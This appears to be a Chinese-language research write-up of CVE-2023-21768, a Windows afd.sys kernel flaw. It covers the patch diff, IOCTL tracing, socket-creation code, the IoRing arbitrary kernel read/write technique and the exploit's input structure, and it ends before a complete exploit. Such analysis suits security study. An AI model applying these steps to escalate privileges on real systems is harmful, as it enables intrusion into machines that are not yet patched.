# CVE-2023-21768

AFD （Ancillary Function Driver for WinSock）是Windows操作系统中的一个内核模式驱动程序，它也是套接字（Socket） 通信的核心模块之一。

## diff

download windows 22h2
```txt
ed2k://|file|zh-cn_windows_11_consumer_editions_version_22h2_updated_nov_2022_x64_dvd_2c7e96c3.iso|5673539584|EB8FF2B481BB6AFE71B2784C6485733B|/
```

diff
![bindiff](./imgs/bindiff.png)

bindiff graph
![diff](./imgs/afd_diff.png)


漏洞修复之后，加了一个验证
```cpp
**(_DWORD **)(a3 + 24) = v20;
goto LABEL_33;

// win11 23h2
if ( a1 )
  ProbeForWrite(*(volatile void **)(a3 + 24), 4ui64, 4u);
**(_DWORD **)(a3 + 24) = v20;
goto LABEL_36;
```

ProbeForWrite 检查用户模式缓冲区是否实际驻留在地址空间的用户模式部分、是否可写以及是否正确对齐。

```cpp
void ProbeForWrite(
  [in, out] volatile VOID *Address,
  [in]      SIZE_T        Length,
  [in]      ULONG         Alignment
);
```


## IOCTLS

afd.sys存在两个dispatch table

AfdNotifySock在`.rdata` 和 `.pdate`处存在引用

rdata是一个表，表名`AfdImmediateCallDispatch`
```cpp
.rdata:00000001C004F3B0 AfdImmediateCallDispatch dq 0 
```

从而找到 `AfdFastIoDeviceControl` 和 `AfdDispatchImmediateIrp`函数

driver初始化部分
```cpp
DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)AfdDispatchDeviceControl;
DriverObject->MajorFunction[15] = (PDRIVER_DISPATCH)&AfdWskDispatchInternalDeviceControl;
DriverObject->MajorFunction[23] = (PDRIVER_DISPATCH)&AfdEtwDispatch;
DriverObject->FastIoDispatch = (PFAST_IO_DISPATCH)&AfdFastIoDispatch;
DriverObject->DriverUnload = (PDRIVER_UNLOAD)AfdUnload;
```

存在两处IOCTL table，Irp是AfdDispatchDeviceControl，另一个是FastIo
```cpp
AfdIrpCallDispatch
AfdImmediateCallDispatch 
```

交叉引用，这两处地方都能走到漏洞函数
```cpp
AfdFastIoDeviceControl -> AfdFastIoDispatch表 -> AfdNotifySock -> AfdNotifyRemoveIoCompletion

AfdDispatchDeviceControl -> AfdIrpCallDispatch表 -> AfdDispatchImmediateIrp -> AfdImmediateCallDispatch表 -> AfdNotifySock
```

#### FastIoDispatch

MajorFunction: 包含了一组例程，当I/O管理器接收到一个I/O请求时，它会根据I/O请求中的相关信息，找到设备对象的驱动程序对象，并调用驱动程序中相应的例程来处理该I/O请求

FastIoDispatch：指向快速I/O的分发结构，是Cache Manager调用所引发的一种没有irp的请求。
```cpp
typedef struct _FAST_IO_DISPATCH {
  ULONG                                  SizeOfFastIoDispatch;
  PFAST_IO_CHECK_IF_POSSIBLE             FastIoCheckIfPossible;
  PFAST_IO_READ                          FastIoRead;
  PFAST_IO_WRITE                         FastIoWrite;
  PFAST_IO_QUERY_BASIC_INFO              FastIoQueryBasicInfo;
  PFAST_IO_QUERY_STANDARD_INFO           FastIoQueryStandardInfo;
  PFAST_IO_LOCK                          FastIoLock;
  PFAST_IO_UNLOCK_SINGLE                 FastIoUnlockSingle;
  PFAST_IO_UNLOCK_ALL                    FastIoUnlockAll;
  PFAST_IO_UNLOCK_ALL_BY_KEY             FastIoUnlockAllByKey;
  PFAST_IO_DEVICE_CONTROL                FastIoDeviceControl;
  PFAST_IO_ACQUIRE_FILE                  AcquireFileForNtCreateSection;
  PFAST_IO_RELEASE_FILE                  ReleaseFileForNtCreateSection;
  PFAST_IO_DETACH_DEVICE                 FastIoDetachDevice;
  PFAST_IO_QUERY_NETWORK_OPEN_INFO       FastIoQueryNetworkOpenInfo;
  PFAST_IO_ACQUIRE_FOR_MOD_WRITE         AcquireForModWrite;
  PFAST_IO_MDL_READ                      MdlRead;
  PFAST_IO_MDL_READ_COMPLETE             MdlReadComplete;
  PFAST_IO_PREPARE_MDL_WRITE             PrepareMdlWrite;
  PFAST_IO_MDL_WRITE_COMPLETE            MdlWriteComplete;
  PFAST_IO_READ_COMPRESSED               FastIoReadCompressed;
  PFAST_IO_WRITE_COMPRESSED              FastIoWriteCompressed;
  PFAST_IO_MDL_READ_COMPLETE_COMPRESSED  MdlReadCompleteCompressed;
  PFAST_IO_MDL_WRITE_COMPLETE_COMPRESSED MdlWriteCompleteCompressed;
  PFAST_IO_QUERY_OPEN                    FastIoQueryOpen;
  PFAST_IO_RELEASE_FOR_MOD_WRITE         ReleaseForModWrite;
  PFAST_IO_ACQUIRE_FOR_CCFLUSH           AcquireForCcFlush;
  PFAST_IO_RELEASE_FOR_CCFLUSH           ReleaseForCcFlush;
} FAST_IO_DISPATCH, *PFAST_IO_DISPATCH;
```

### R0 R3 通信

我们可以通过DeviceIoControl进行通信

也可以使用 NtDeviceIoControlFile 控制代码直接发送到指定的设备驱动程序，驱动程序执行指定的操作

```cpp
__kernel_entry NTSYSCALLAPI NTSTATUS NtDeviceIoControlFile(
  [in]            HANDLE           FileHandle,
  [in, optional]  HANDLE           Event,
  [in, optional]  PIO_APC_ROUTINE  ApcRoutine,
  [in, optional]  PVOID            ApcContext,
  [out]           PIO_STATUS_BLOCK IoStatusBlock,
  [in]            ULONG            IoControlCode,
  [in, optional]  PVOID            InputBuffer,
  [in]            ULONG            InputBufferLength,
  [out, optional] PVOID            OutputBuffer,
  [in]            ULONG            OutputBufferLength
);
```

### AfdFastIoDeviceControl

AfdFastIoDeviceControl，这个a7应该是IoControlCode
```cpp
char __fastcall AfdFastIoDeviceControl(
        __int64 a1,
        __int64 a2,
        unsigned int *a3,
        unsigned int a4,
        unsigned __int64 a5,
        int a6,
        unsigned int a7,
        __int64 a8,
        __int64 a9)
// ....
    if ( a7 != 0x1201B )
      {
        if ( a7 != 0x12023 )
        {
LABEL_202:
          v64 = (a7 >> 2) & 0x3FF;
          if ( v64 < 0x4A && AfdIoctlTable[v64] == a7 )
          {
            v65 = (__int64 (__fastcall *)(__int64, _QWORD, _QWORD, unsigned int *, unsigned int, unsigned __int64, int, __int64))AfdImmediateCallDispatch[v64];
            if ( v65 )
            {
              *(_DWORD *)v107 = v65(a1, a7, PreviousMode, a3, a4, v106, a6, v107 + 8);
              LOBYTE(v12) = 1;
            }
          }
          goto LABEL_58;
        }
      }
// ...
```

找到AfdIoctlTable
```cpp
.rdata:00000001C0050A00 ; int AfdIoctlTable[76]
.rdata:00000001C0050A00 AfdIoctlTable   dd 12003h, 12007h, 1200Bh, 1200Ch, 12010h, 12017h, 1201Bh
.rdata:00000001C0050A00                                         ; DATA XREF: AfdFastIoDeviceControl+F18↑r
.rdata:00000001C0050A00                                         ; AfdDispatchDeviceControl+4F↑r
.rdata:00000001C0050A1C                 dd 1201Fh, 12023h, 12024h, 1202Bh, 1202Fh, 12033h, 12037h
.rdata:00000001C0050A38                 dd 1203Bh, 1203Fh, 12043h, 12047h, 1204Bh, 1204Fh, 12053h
.rdata:00000001C0050A54                 dd 12057h, 1205Bh, 1205Fh, 12063h, 12067h, 1206Bh, 1206Fh
.rdata:00000001C0050A70                 dd 12073h, 12077h, 1207Bh, 1207Fh, 12083h, 12087h, 1208Bh
.rdata:00000001C0050A8C                 dd 1208Ch, 12090h, 12094h, 12098h, 1209Fh, 120A0h, 120A7h
.rdata:00000001C0050AA8                 dd 120ABh, 120ACh, 120B3h, 120B4h, 120BBh, 120BFh, 120C3h
.rdata:00000001C0050AC4                 dd 120C7h, 120CBh, 120CFh, 120D3h, 120D7h, 120DBh, 120DFh
.rdata:00000001C0050AE0                 dd 120E2h, 120E7h, 120EBh, 120EFh, 120F3h, 120F7h, 120FBh
.rdata:00000001C0050AFC                 dd 120FFh, 12103h, 12107h, 1210Bh, 1210Ch, 12113h, 12117h
.rdata:00000001C0050B18                 dd 1211Bh, 1211Fh, 12123h, 12127h, 2 dup(0)
```

调用
```cpp
AfdIoctlTable[(a7 >> 2) & 0x3FF] == a7

// 可以通过已知偏移计算出来
(a7 >> 2) & 0x3FF == 0x49
```

因此`a7 == 0x12127`

### AfdNotifySock

需要了解函数参数是什么

我们可以创建一个socket进行通信，但是比较容易被windows防火墙查杀。
```cpp
#include<Windows.h>
#include<stdio.h>
#pragma comment(lib,"ws2_32.lib")

int main()
{
    INT ret;
    WSADATA wsa;
    WSAStartup(0x2, &wsa);
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_port = htons(135);
    sa.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    sa.sin_family = AF_INET;
    ret = connect(s, (SOCKADDR*)&sa, sizeof(sa));
    DWORD bytesRet;
    BYTE szInbuffer[0x100];
    BYTE szOutbuffer[0x100];
    RtlFillMemory(szOutbuffer, sizeof(szOutbuffer), 0x43);
    RtlFillMemory(szInbuffer, sizeof(szInbuffer), 0x44);
    // 这里可以测
    DeviceIoControl((HANDLE)s, 0x12127, szInbuffer, 0xde, szOutbuffer, 0xbf, &bytesRet, NULL);
    return 0;
}
```

可以使用 `NtCreateFile` 来创建一个socket，更加隐蔽：[ntsockets](https://www.x86matthew.com/view_post?id=ntsockets)
- 据文章来说，WinSock Lib是这么干的
- 可以使用NtDeviceIoControl发送socket数据，但是我们这里只需要一个Socket handle就行

```cpp
DWORD NTSockets_CreateTcpSocket(NTSockets_SocketDataStruct *pSocketData)
{
	IO_STATUS_BLOCK IoStatusBlock;
	HANDLE hEvent = NULL;
	HANDLE hSocket = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	NTSockets_SocketDataStruct SocketData;
	UNICODE_STRING ObjectFilePath;
	DWORD dwStatus = 0;
	BYTE bExtendedAttributes[] =
	{
		0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00, 0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
		0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x60, 0xEF, 0x3D, 0x47, 0xFE
	};

	// create status event
	hEvent = CreateEvent(NULL, 0, 0, NULL);
	if(hEvent == NULL)
	{
		// error
		return 1;
	}

	// set afd endpoint path
	memset((void*)&ObjectFilePath, 0, sizeof(ObjectFilePath));
	ObjectFilePath.Buffer = L"\\Device\\Afd\\Endpoint";
	ObjectFilePath.Length = wcslen(ObjectFilePath.Buffer) * sizeof(WHCAR);
	ObjectFilePath.MaximumLength = ObjectFilePath.Length;

	// initialise object attributes
	memset((void*)&ObjectAttributes, 0, sizeof(ObjectAttributes));
	ObjectAttributes.Length = sizeof(ObjectAttributes);
	ObjectAttributes.ObjectName = &ObjectFilePath;
	ObjectAttributes.Attributes = 0x40;

	// create socket handle
	IoStatusBlock.Status = 0;
	IoStatusBlock.Information = NULL;

  // CreateSocket
	dwStatus = NtCreateFile(&hSocket, 0xC0140000, &ObjectAttributes, &IoStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 1, 0, bExtendedAttributes, sizeof(bExtendedAttributes));
	if(dwStatus != 0)
	{
		// error
		CloseHandle(hEvent);
		return 1;
	}

	// initialise SocketData object
	memset((void*)&SocketData, 0, sizeof(SocketData));
	SocketData.hSocket = hSocket;
	SocketData.hStatusEvent = hEvent;

	// store socket data
	memcpy((void*)pSocketData, (void*)&SocketData, sizeof(SocketData));
	return 0;
}
```

关注一下寄存器，多余的参数使用栈传递。下断点查看
```cmd
1: kd> r
2: kd> r
rcx=ffffc0836b533820 => a1
rdx=0000000000012127 => ioctl code
r8=0000000000000001  => previous mode
r9=0000001d78bbf6a0  => 0x444444 inbuffer
```

使用栈传递参数，windbg让其继续走，走到如下，查看内存
```cpp
2: kd> dq @rsp
ffff9705`5b362448  fffff804`61dc6951=>返回地址 ffffc083`697fd240
ffff9705`5b362458  ffff9705`5b3628b0 0000001d`78bbee10
ffff9705`5b362468  00000000`00000001 ffffc083`000000de=>inbuf length
ffff9705`5b362478  0000001d`78bbf5a0=>outbuf ffffc083`000000bf=>outbuf length

// 在 windbg中
cmp     dword ptr [rsp+0F0h], 30h

// 反编译
PAGE:00000001C006FC75                 cmp     [rsp+0C8h+a5], 30h ; '0'
PAGE:00000001C006FC7D                 jz      short loc_1C006FC89
PAGE:00000001C006FC7F
PAGE:00000001C006FC7F loc_1C006FC7F:                          ; CODE XREF: AfdNotifySock+60↓j
PAGE:00000001C006FC7F                 mov     ebx, 0C0000004h
PAGE:00000001C006FC84                 jmp     loc_1C006FEDA
PAGE:00000001C006FC89 ; ---------------------------------------------------------------------------
PAGE:00000001C006FC89
PAGE:00000001C006FC89 loc_1C006FC89:                          ; CODE XREF: AfdNotifySock+4D↑j
PAGE:00000001C006FC89                 cmp     [rsp+0C8h+a7], edi
PAGE:00000001C006FC90                 jnz     short loc_1C006FC7F
PAGE:00000001C006FC92                 cmp     [rsp+0C8h+a6], rdi
PAGE:00000001C006FC9A                 jz      short loc_1C006FCA6
```

从而可以计算出参数位置距离刚开始rsp 0x28（0xf0-0xc8=0x28），得出栈布局
```
返回地址
xxx
xxx
xxx
xxx
inbufferlength
outbuffer
outbufferlength
```

a1的值：[寻找一个包含FastIo的教程](https://www.codeproject.com/Articles/43586/File-System-Filter-Driver-Tutorial?msg=4432676#xx4432676xx)。第一个参数是个FileObject

```cpp
BOOLEAN FsFilterFastIoQueryBasicInfo(
    __in PFILE_OBJECT       FileObject,
    __in BOOLEAN            Wait,
    __out PFILE_BASIC_INFORMATION Buffer,
    __out PIO_STATUS_BLOCK  IoStatus,
    __in PDEVICE_OBJECT     DeviceObject
    )
```

## io ring

异步IO，最多可提交0x10000个IO请求

[ioringapi](https://learn.microsoft.com/en-us/windows/win32/api/ioringapi/)

[demo](https://github.com/yardenshafir/IoRing_Demos/blob/main/ioringnt.h)

[i-o-ring](https://windows-internals.com/i-o-rings-when-one-i-o-operation-is-not-enough/)

[i-o-ring change](https://windows-internals.com/one-year-to-i-o-ring-what-changed/)

[io-ring rw](https://knifecoat.com/Posts/Arbitrary+Kernel+RW+using+IORING's)

[read-write-exploit-primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)

### API

用户态的API：`C:\Windows\System32\KernelBase.dll`

#### CreateIoRing

创建一个IO ring，在22h2最大是VERSION_3，但是又更新了
```cpp
typedef enum IORING_VERSION {
  IORING_VERSION_INVALID,
  IORING_VERSION_1,
  IORING_VERSION_2,
  IORING_VERSION_3,
  IORING_VERSION_4
} ;

typedef struct IORING_CREATE_FLAGS {
  IORING_CREATE_REQUIRED_FLAGS Required;
  IORING_CREATE_ADVISORY_FLAGS Advisory;
} IORING_CREATE_FLAGS;

typedef enum IORING_CREATE_REQUIRED_FLAGS {
  IORING_CREATE_REQUIRED_FLAGS_NONE
} ;

typedef enum IORING_CREATE_ADVISORY_FLAGS {
  IORING_CREATE_ADVISORY_FLAGS_NONE,
  IORING_CREATE_SKIP_BUILDER_PARAM_CHECKS
} ;

HRESULT CreateIoRing(
  IORING_VERSION      ioringVersion,
  IORING_CREATE_FLAGS flags,
  UINT32              submissionQueueSize,      // 请求的最小提交队列大小。 系统可能会根据需要舍入大小，以确保实际大小为 2 的幂
  UINT32              completionQueueSize,      // 请求的完成队列的最小大小，这不低于实际提交队列大小的两倍，以便允许提交。
  HIORING             *h
);
```

HIORING结构，没在文档中说明
```cpp
typedef struct _HIORING {
    HANDLE handle;
    NT_IORING_INFO Info;
    ULONG IoRingKernelAcceptedVersion;
    PVOID RegBufferArray;
    ULONG BufferArraySize;
    PVOID Unknown;
    ULONG FileHandlesCount;
    ULONG SubQueueHead;
    ULONG SubQueueTail;
} HIORING, *PHIORING;
```

会在在内核创建一个`_IORING_OBJECT`结构
```cpp
0: kd> dt nt!_IORING_OBJECT
   +0x000 Type             : Int2B
   +0x002 Size             : Int2B
   +0x008 UserInfo         : _NT_IORING_INFO
   +0x038 Section          : Ptr64 Void
   +0x040 SubmissionQueue  : Ptr64 _NT_IORING_SUBMISSION_QUEUE
   +0x048 CompletionQueueMdl : Ptr64 _MDL
   +0x050 CompletionQueue  : Ptr64 _NT_IORING_COMPLETION_QUEUE
   +0x058 ViewSize         : Uint8B
   +0x060 InSubmit         : Int4B
   +0x068 CompletionLock   : Uint8B
   +0x070 SubmitCount      : Uint8B
   +0x078 CompletionCount  : Uint8B
   +0x080 CompletionWaitUntil : Uint8B
   +0x088 CompletionEvent  : _KEVENT
   +0x0a0 SignalCompletionEvent : UChar
   +0x0a8 CompletionUserEvent : Ptr64 _KEVENT
   +0x0b0 RegBuffersCount  : Uint4B
   +0x0b8 RegBuffers       : Ptr64 Ptr64 _IOP_MC_BUFFER_ENTRY
   +0x0c0 RegFilesCount    : Uint4B
   +0x0c8 RegFiles         : Ptr64 Ptr64 Void
```

#### BuildIoRingxxx

创建请求
```cpp
// 申请缓冲器
HRESULT BuildIoRingRegisterBuffers(
  HIORING                     ioRing,
  UINT32                      count,
  IORING_BUFFER_INFO const [] buffers,
  UINT_PTR                    userData
);

// 从提供的文件句柄创建 IORING_HANDLE_REF 结构的实例。
#define IoRingHandleRefFromHandle(h) IORING_HANDLE_REF(static_cast<HANDLE>(h))

// 从提供的缓冲区索引和偏移量创建 IORING_BUFFER_REF 结构的实例。
#define IoRingBufferRefFromIndexAndOffset(i,o) IORING_BUFFER_REF((i),(o))

// 从提供的指针创建 IORING_BUFFER_REF 结构的实例。
#define IoRingBufferRefFromPointer(p) IORING_BUFFER_REF(static_cast<void*>(p))

// 读取文件
HRESULT BuildIoRingReadFile(
  HIORING           ioRing,
  IORING_HANDLE_REF fileRef,                  // 指定要读取的文件 IORING_HANDLE_REF 
  IORING_BUFFER_REF dataRef,                  // 一个IORING_BUFFER_REF，指定将文件读入其中的缓冲区。 提供的缓冲区的大小必须至少为 numberOfBytesToRead 字节。
  UINT32            numberOfBytesToRead,
  UINT64            fileOffset,
  UINT_PTR          userData,
  IORING_SQE_FLAGS  sqeFlags
);

// 往文件写入内容
STDAPI
BuildIoRingWriteFile(
    _In_ HIORING ioRing,
    IORING_HANDLE_REF fileRef,
    IORING_BUFFER_REF bufferRef,
    UINT32 numberOfBytesToWrite,
    UINT64 fileOffset,
    FILE_WRITE_FLAGS writeFlags,
    UINT_PTR userData,
    IORING_SQE_FLAGS sqeFlags
    );
```

#### SubmitIoRing

将所有已构造但尚未提交的条目提交到内核的队列，并根据需要等待一组操作完成。

```cpp
HRESULT SubmitIoRing(
  HIORING ioRing,
  UINT32  waitOperations,
  UINT32  milliseconds,
  UINT32  *submittedEntries
);
```

读文件demo
```cpp
#include <Windows.h>
#include <iostream>
#include <ioringapi.h>

int main() 
{
	HIORING ioring;
	IORING_CREATE_FLAGS flags;
	flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
	flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
	HRESULT res =  CreateIoRing(IORING_VERSION_3, flags, 0x10, 0x20, &ioring);
	if (res != S_OK)
	{
		wprintf(L"[-] Error CreateIoRing\r\n");
	}
	
	HANDLE hFile = CreateFileW(
		L"C:\\Users\\Lenovo\\Desktop\\test.txt", 
		GENERIC_READ,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		wprintf(L"[-] Error CreateFileW");
		return EXIT_FAILURE;
	}
	IORING_BUFFER_INFO buffer;
	buffer.Address = malloc(0x100);
	buffer.Length = 0x100;
	RtlZeroMemory(buffer.Address, 0x100);
	res = BuildIoRingRegisterBuffers(ioring, 1, &buffer, 0);
	if (res != S_OK)
	{
		wprintf(L"[-] Error BuildIoRingRegisterBuffers\r\n");
		return EXIT_FAILURE;
	}

	IORING_HANDLE_REF ioringHandleRef = IoRingHandleRefFromHandle(hFile);
	IORING_BUFFER_REF ioringBufferRef = IoRingBufferRefFromIndexAndOffset(0, 0);
	res = BuildIoRingReadFile(ioring, ioringHandleRef, ioringBufferRef, 0x100, 0, NULL, IOSQE_FLAGS_NONE);
	if (res != S_OK)
	{
		wprintf(L"[-] Error CreateIoRing\r\n");
		goto clean;
	}
	res = SubmitIoRing(ioring, 0, 0, 0);
	if (res != S_OK)
	{
		wprintf(L"[-] Error CreateIoRing\r\n");
		goto clean;
	}
	printf("buffer => %s\n", (LPCSTR)buffer.Address);
clean:
	free(buffer.Address);
	CloseHandle(hFile);
	wprintf(L"[+] Quit\r\n");
	CloseIoRing(ioring);
	getchar();
	return EXIT_SUCCESS;
}
```

##### Submission Queue

变化还蛮大的

IORING_OBJECT.SubmissionQueue
```cpp
0: kd> dt nt!_NT_IORING_SUBMISSION_QUEUE
   +0x000 Head             : Uint4B
   +0x004 Tail             : Uint4B
   +0x008 Flags            : _NT_IORING_SQ_FLAGS
   +0x010 Entries          : [1] _NT_IORING_SQE
```
<div align="left">
	<img src="./imgs/submit_queue.png" width="30%">
</div>


是一个 ring
<div align="left">
	<img src="./imgs/ioring_sq.png" width="50%">
</div>


每一个NT_IORING_SQE，都代表着一个I/O操作
```cpp
0: kd> dt nt!_NT_IORING_SQE
   +0x000 OpCode           : IORING_OP_CODE
   +0x004 Flags            : _NT_IORING_SQE_FLAGS
   +0x008 UserData         : Uint8B
   +0x008 PaddingUserDataForWow : Uint8B
   +0x010 Read             : _NT_IORING_OP_READ
   +0x010 RegisterFiles    : _NT_IORING_OP_REGISTER_FILES
   +0x010 RegisterBuffers  : _NT_IORING_OP_REGISTER_BUFFERS
   +0x010 Cancel           : _NT_IORING_OP_CANCEL
   +0x010 Write            : _NT_IORING_OP_WRITE
   +0x010 Flush            : _NT_IORING_OP_FLUSH
   +0x010 ReservedMaxSizePadding : _NT_IORING_OP_RESERVED

0: kd> dt ntkrnlmp!_NT_IORING_OP_READ
   +0x000 CommonOpFlags    : _NT_IORING_OP_FLAGS
   +0x004 Padding          : Uint4B
   +0x008 File             : _NT_IORING_HANDLEREF
   +0x010 Buffer           : _NT_IORING_BUFFERREF
   +0x018 Offset           : Uint8B
   +0x020 Length           : Uint4B
   +0x024 Key              : Uint4B
```

主要操作
- IORING_OP_READ：将文件中的数据读入输出缓冲区。对应BuildIoRingReadFile()函数。
- IORING_OP_REGISTER_FILES：请求文件句柄的预注册以便稍后处理。对应BuildIoRingRegisterFileHandles()函数。
- IORING_OP_REGISTER_BUFFERS:请求为要读入的文件数据预注册输出缓冲区。对应BuildIoRingRegisterBuffers()函数。
- IORING_OP_CANCEL：请求取消文件的挂起操作。对应BuildIoRingCancelRequest()函数。
- IORING_OP_WRITE：将输出缓冲区的数据写入文件。对应BuildIoRingWriteFile()函数。
- IORING_OP_FLUSH: 刷新操作。对应BuildIoRingFlushFile()函数。

```cpp
typedef enum IORING_OP_CODE {
  IORING_OP_NOP,
  IORING_OP_READ,
  IORING_OP_REGISTER_FILES,
  IORING_OP_REGISTER_BUFFERS,
  IORING_OP_CANCEL,
  IORING_OP_WRITE,
  IORING_OP_FLUSH,
  IORING_OP_READ_SCATTER,
  IORING_OP_WRITE_GATHER
} ;
```

```cpp
typedef struct IORING_BUFFER_INFO {
  void   *Address;
  UINT32 Length;
} IORING_BUFFER_INFO;
```

##### Completion Queue

其结构如下
```cpp
0: kd> dt nt!_NT_IORING_COMPLETION_QUEUE
   +0x000 Head             : Uint4B
   +0x004 Tail             : Uint4B
   +0x008 Entries          : [1] 

0: kd> dt nt!_NT_IORING_CQE
   +0x000 UserData         : Uint8B
   +0x000 PaddingUserDataForWow : Uint8B
   +0x008 IoStatus         : _IO_STATUS_BLOCK
```

从完成队列中弹出单个条目
```cpp
typedef struct IORING_CQE {
  UINT_PTR  UserData;
  HRESULT   ResultCode;
  ULONG_PTR Information;
} IORING_CQE;

HRESULT PopIoRingCompletion(
  HIORING    ioRing,
  IORING_CQE *cqe
);
```

#### CloseIoRing

```cpp
HRESULT CloseIoRing(
  HIORING ioRing
);
```

### IORing任意读写

我们可以控制 `IORING_OBJECT`的 成员变量`RegBuffersCount` && `RegBuffers`，相当于buffer和offset进行读取
- 在这里是任意写1，因此首先修改`RegBuffersCount` 为1
- `RegBuffers` 可以修改为 0x1000000

用户空间，可以VirtualAlloc，从而伪造`RegBuffers`
- BuildIoRingReadFile : 从file handler读取, 写入到`IOP_MC_BUFFER_ENTRY.Address` 长度为 IOP_MC_BUFFER_ENTRY.Length. 任意写
- BuildIoRingWriteFile: 从 `IOP_MC_BUFFER_ENTRY.Address`读取数据，长度为`IOP_MC_BUFFER_ENTRY.Length`, 写入文件，任意地址写。

并且在用户空间的 `HIORING`的`RegisterBufferArray` 和 `BufferArraySize`也需要修改成对应的值。

#### RegBuffer

Windows 11 22H2版本下，RegBuffers不再是地址和长度的平面数组(IORING_BUFFER_INFO)，而是一个新的结构体。

Input/Output Processo Memory Control?
```cpp
typedef struct _IOP_MC_BUFFER_ENTRY
{
    USHORT                Type;
    USHORT                Reserved;
    ULONG                 Size;
    ULONG                 ReferenceCount;
    ULONG                 Flags;              
    LIST_ENTRY            GlobalDataLink;
    PVOID                 Address;            // 缓冲区地址
    ULONG                 Length;             // 缓冲区长度
    CHAR                  AccessMode;         // 缓冲区访问模式
    ULONG                 MdlRef;             // 缓冲区MDL引用
    PMDL                  Mdl;                // 缓冲区MDL
    KEVENT                MdlRundownEvent;
    PULONG64              PfnArray;
    IOP_MC_BE_PAGE_NODE   PageNodes[1];
} IOP_MC_BUFFER_ENTRY, *PIOP_MC_BUFFER_ENTRY;
```

初始化需要我们注意某些数据的值
```cpp
mcBufferEntry->Address = TargetAddress;
mcBufferEntry->Length = Length;
mcBufferEntry->Type = 0xc02;
mcBufferEntry->Size = 0x80;           // 0x20 * (numberOfPagesInBuffer + 3)
mcBufferEntry->AccessMode = 1;        
mcBufferEntry->ReferenceCount = 1;
```

#### 任意读

- 设置好要读的内核地址TargetAddress: 直接在用户态修改`_IOP_MC_BUFFER_ENTRY`
- 将TargetAddress的值写入到文件: BuildIoRingWriteFile()
- 读取文件里面的值: ReadFile()


#### 任意写

- 将value写入到文件中: WriteFile()
- 设置好要写的内核地址TargetAddress: 直接在用户态修改`_IOP_MC_BUFFER_ENTRY`
- 读取文件内容到缓冲区，也就是TargetAddress: BuildIoRingReadFile()

#### 注意事项

pipe也是个文件，作为文件Handle传递。

内核会free RegisterBuffers，因此在漏洞结束后需要将 `RegBuffers` 和 `RegBufferCount`改为0

## Exploit

首先我们传入数据需要绕过检测
```cpp
if ( !*((_DWORD *)_inputBuffer + 8) )
    goto LABEL_5;
  if ( *((_DWORD *)_inputBuffer + 10) )
  {
    if ( !*((_QWORD *)_inputBuffer + 3) || !*((_QWORD *)_inputBuffer + 2) )
      goto LABEL_5;
  }
  else if ( *((_QWORD *)_inputBuffer + 2) || *((_DWORD *)_inputBuffer + 9) )
  {
LABEL_5:
    v10 = 0xC000000D;
    goto LABEL_45;
  }
```

然后走到漏洞函数位置
```cpp
v10 = AfdNotifyRemoveIoCompletion(PreviousMode, (__int64)v9, (__int64)_inputBuffer);
```

需要继续绕过某些检测
```cpp
  v6 = *(unsigned int *)(inputBuffer + 40);
  if ( !(_DWORD)v6 ) // 不能进入
  {
LABEL_33:
    v8 = 0;
    goto LABEL_34;   
  }
  v7 = 32 * v6;
  if ( is_mul_ok(v6, 0x20ui64) ) 
  {
    v8 = 0;
    v9 = -1i64;
  }
  else
  {
    v9 = -1i64;
    v7 = -1i64;
    v8 = 0xC0000095;
  }
  if ( v8 >= 0 )
    v8 = IoRemoveIoCompletion(v25, Pool2, v4, (unsigned int)v6, &v20, PreviousMode, v13, 0);
    if ( !v8 )  // 进入if
    {
      if ( v19 )
      {
        for ( i = 0; i < v20; ++i )
        {
          v15 = &Pool2[32 * i];
          v16 = (_DWORD *)(*(_QWORD *)(inputBuffer + 16) + 16i64 * i);
          *v16 = *(_DWORD *)v15;
          v16[1] = *((_DWORD *)v15 + 2);
          v16[3] = *((_DWORD *)v15 + 6);
          v16[2] = *((_DWORD *)v15 + 4);
        }
      }
      **(_DWORD **)(inputBuffer + 24) = v20;  // v20
      goto LABEL_33;
    }
```

传入的是一个0x30大小的结构体
```cpp
typedef struct AFD_NOTIFYSOCK_DATA
{
    HANDLE hCompletion; // +0x0
    PVOID pData1;       // +0x8
    PVOID pData2;       // +0x10
    PVOID pPwnPtr;      // +0x18
    DWORD dwCounter;    // +0x20
    DWORD dwTimeout;    // +0x24 
    DWORD dwLen;        // +0x28
    char padding[0x4];  // +0x2c
}AFD_NOTIFYSOCK_DATA;
```

然后需要分析一下如下的函数
```cpp
IoRemoveIoCompletion(v25, Pool2, v4, (unsigned int)dwLen, &v20, PreviousMode, v13, 0);
```

是个库函数，借助windbg定位，在`ntkrnlmp.exe`中
```cpp
// NtSetIoCompletion进行添加，使IoRemoveIoCompletion返回0.
__int64 __fastcall IoRemoveIoCompletion(
        struct _KQUEUE *a1,
        __int64 a2,
        PLIST_ENTRY *a3,
        ULONG a4,
        ULONG *a5,
        KPROCESSOR_MODE a6,
        LARGE_INTEGER *a7,
        BOOLEAN a8)
```

跟踪a5

```cpp
v10 = KeRemoveQueueEx(a1, a6, a8, a7, a3, a4);
...
*a5 = v10

// 这个函数返回1
ULONG __stdcall KeRemoveQueueEx(
        PKQUEUE Queue,
        KPROCESSOR_MODE WaitMode,
        BOOLEAN Alertable,
        PLARGE_INTEGER Timeout,
        PLIST_ENTRY *EntryArray,
        ULONG Count)

// 为了让函数返回1，让这个队列存在一个值，我们可以让其成功remove
// 创建->finish->remove
NtCreateIoCompletion
NtSetIoCompletion
```

